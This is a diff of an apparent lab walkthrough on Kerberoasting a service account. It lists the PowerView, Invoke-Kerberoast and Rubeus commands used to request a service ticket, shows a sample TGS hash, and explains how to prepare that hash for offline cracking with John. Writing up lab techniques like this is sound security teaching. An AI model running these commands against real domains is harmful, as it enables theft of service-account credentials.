@@ -50,7 +50,11 @@ samAccountName    : mssql_svc
 servicePrincipalName : MSSQLSvc/sql-1.dev.dhitalcorp.local:1433
 userPrincipalName : SQLService@dev.dhitalcorp.local
 ```
-We can request service ticket for this `mssql_svc` service account using Rubeus as below. We can also use PowerView itself as `Get-DomainUser -SPN mssql_svc | Get-DomainSPNTicket` or using [Invoke-Kerberoast](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/). If you want the hash in specific format for cracking we can also request it using OutputFormat as `Get-DomaintUser -SPN mssql_svc | Get-DomainSPNTicket -OutputFormat hashcat`. Below we are using Rubeus. 
+We can request service ticket for this `mssql_svc` service account and crack it offline.
+- We can also use PowerView to request service ticket for this `mssql_svc` service account:  `Get-DomainUser -SPN mssql_svc | Get-DomainSPNTicket`
+- We can also use [Invoke-Kerberoast](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/) to both find and roast kerberoastable accounts.
+-  If you want the hash in specific format for cracking we can also request it using OutputFormat as `Get-DomaintUser -SPN mssql_svc | Get-DomainSPNTicket -OutputFormat hashcat`.
+Below we are using Rubeus. 
 
 ```bash
 PS C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
@@ -70,7 +74,7 @@ PS C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user
 [*] RC4_HMAC(NT) hash for mssql_svc@DEV.DHITALCORP.LOCAL:
 $krb5tgs$23$*mssql_svc$DEV.DHITALCORP.LOCAL$MSSQLSvc/sql-1.dev.dhitalcorp.local:1433*$D098E44F9B1C3CDE120A4A3DA2D32C4F$5C233E56F3C8B12F7D0B8A5DCC5A8D0C99E3B5F471D618F3B830C6F7E6FDE63DDA3C91C8E5A5D78F3A8B49A4E59CBFA2EED4A6B91FC3E671B1C8B08A9AC292FB
 ```
-Remove the service principal name from the hash to crack using John. The hash should be in format `$krb5tgs$23$*mssql_svc$DEV.DHITALCORP.LOCAL*$D098E44F9B1C3CDE120A4A3DA2D32C4F$5C233E56F3C8B12F7D0B8A5DCC5A8D0C99E3B5F471D618F3B830C6F7E6FDE63DDA3C91C8E5A5D78F3A8B49A4E59CBFA2EED4A6B91FC3E671B1C8B08A9AC292FB`. We can crack this using John as follows.
+Remove the service principal name from the hash to crack using John. The hash should be in format `$krb5tgs$23$*mssql_svc$DEV.DHITALCORP.LOCAL*$D098E44F9B1C3CDE120A4A3DA2D32C4F$5C233E56F3C8B12F7D0B8A5DCC5A8D0C99E3B5F471D618F3B830C6F7E6FDE63DDA3C91C8E5A5D78F3A8B49A4E59CBFA2EED4A6B91FC3E671B1C8B08A9AC292FB`. Save the hash as `mssql_svc.txt`. We can crack this using John as follows.
 
 ```bash
 ┌──(alex㉿kali)-[~]
